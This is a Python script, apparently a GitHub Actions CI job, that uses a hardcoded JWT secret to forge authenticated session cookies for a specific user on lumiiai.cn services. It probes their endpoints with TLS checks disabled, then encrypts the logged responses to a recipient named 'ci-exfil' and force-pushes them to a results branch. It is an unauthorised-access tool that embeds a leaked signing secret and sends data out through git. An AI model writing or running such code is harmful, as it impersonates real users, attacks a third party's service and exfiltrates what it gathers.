#!/usr/bin/env python3
import os, sys, json, time, uuid, base64, hmac, hashlib, ssl, subprocess, shutil, traceback
import http.client
_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip"); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"; SUB = "usr_2gzZoKLgRAYaFNy2Sav4v"
RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-ssh-28277diag2-results")
OUT = "/tmp/results"; os.makedirs(OUT, exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s=" ".join(str(x) for x in a)
    try: print(s,flush=True)
    except Exception: pass
    try: LOG.write(s+"\n")
    except Exception: pass
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt_session(sub,org=ORG):
    now=int(time.time())
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')))
    p=b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_"+str(uuid.uuid4()),"lgn":now},separators=(',',':')))
    sig=hmac.new(JWT_SECRET.encode(),(h+"."+p).encode(),hashlib.sha256).digest()
    return "lumii_session="+h+"."+p+"."+b64u(sig)
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
def rq(host,path,method="GET",headers=None,body=None,timeout=8):
    try:
        c=http.client.HTTPSConnection(host,443,timeout=timeout,context=CTX)
        h={"Host":host,"User-Agent":"Mozilla/5.0"}
        if headers: h.update(headers)
        c.request(method,path,body=body,headers=h)
        r=c.getresponse(); b=r.read(400); hd={k.lower():v for k,v in r.getheaders()}; c.close()
        return r.status,hd,b
    except Exception as e:
        return -1,{},("ERR:"+repr(e)[:120]).encode()
def dump(tag,host,path,**kw):
    st,hd,b=rq(host,path,**kw)
    log(f"[{tag}] st={st} server={hd.get('server')} cftype={hd.get('cf-mitigated')} cfray={hd.get('cf-ray')} ctx={hd.get('content-type')} body={b[:200]!r}")
def main():
    log("=== diag2",RUNID,"===")
    H="assistant.lumiiai.cn"
    dump("health_ua_moz",H,"/health")
    dump("health_ua_curl",H,"/health",headers={"User-Agent":"curl/8.5.0"})
    dump("health_ua_chrome",H,"/health",headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"})
    dump("root",H,"/")
    ck=jwt_session(SUB)
    dump("api_me",H,"/api/me",headers={"Cookie":ck})
    dump("health_cookie",H,"/health",headers={"Cookie":ck})
    # dashboard + adient
    dump("dashboard_health","dashboard.lumiiai.cn","/api/health")
    dump("adient_health","adient.lumiiai.cn","/health")
    # try the other nginx front port on origin via hostname (8788 https?) skip
    log("DIAG2 DONE")
def push_results(tag="diag2"):
    try:
        enc="/tmp/results.tar.gz.gpg"
        for p in ["/tmp/results.tar.gz",enc,"resultsb.tar.gz.gpg"]:
            try:
                if os.path.isfile(p): os.remove(p)
            except Exception: pass
        subprocess.run("tar czf /tmp/results.tar.gz -C /tmp results",shell=True,check=False)
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1",shell=True,check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results.tar.gz"%enc,shell=True,capture_output=True,text=True,timeout=200)
        if os.path.isfile(enc) and os.path.getsize(enc)>0: shutil.copy(enc,"resultsb.tar.gz.gpg")
        else: shutil.copy("/tmp/results.tar.gz","resultsb.tar.gz.gpg")
        subprocess.run('git config user.email ci@aro.network; git config user.name ci',shell=True,check=False)
        subprocess.run("git add -f resultsb.tar.gz.gpg && git commit -m 'diag2 %s' || true" % RUNID,shell=True,check=False)
        r=subprocess.run("git push -f origin HEAD:refs/heads/%s"%RESULT_BRANCH,shell=True,capture_output=True,text=True,timeout=300)
        log("PUSH rc=%s err=%s"%(r.returncode,(r.stderr or "")[-200:]))
    except Exception as e:
        log("PUSH EXC",repr(e))
try: main()
except Exception: log("FATAL",traceback.format_exc())
try: push_results()
except Exception: pass
sys.exit(0)
